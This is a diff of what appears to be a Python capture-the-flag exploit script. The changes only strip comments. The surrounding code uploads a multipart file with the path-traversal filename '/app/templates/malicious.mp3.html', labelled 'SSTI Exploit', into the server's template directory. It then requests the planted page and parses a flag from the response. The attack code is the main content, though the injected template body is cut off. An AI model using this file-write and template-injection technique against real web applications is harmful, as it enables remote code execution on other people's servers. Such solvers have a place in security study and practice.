@@ -243,7 +243,6 @@ def upload_file():
         'Connection': 'keep-alive',
     }
 
-    # Corrected payload to include the intended HTML content with SSTI
     data = '''------WebKitFormBoundaryu1i8nw4tZ1Hi1EN7\r\nContent-Disposition: form-data; name="music_file"; filename="/app/templates/malicious.mp3.html"\r\nContent-Type: text/html\r\n\r\n<html>
     <head>
         <title>SSTI Exploit</title>
@@ -275,14 +274,12 @@ def access_payload():
     if response.status_code == 200:
         print("[*] Payload executed successfully.")
 
-        # Use BeautifulSoup to parse the HTML and find the input value
         soup = BeautifulSoup(response.text, 'html.parser')
         input_tag = soup.find('input', {'id': 'page'})
         
         if input_tag and input_tag.has_attr('value'):
-            output = input_tag['value'].strip()  # Extract the value attribute from the input tag
+            output = input_tag['value'].strip() 
 
-            # Use the new page value in the next request
             if output:
                 print(f"[*] Flag: {output}")
             else:
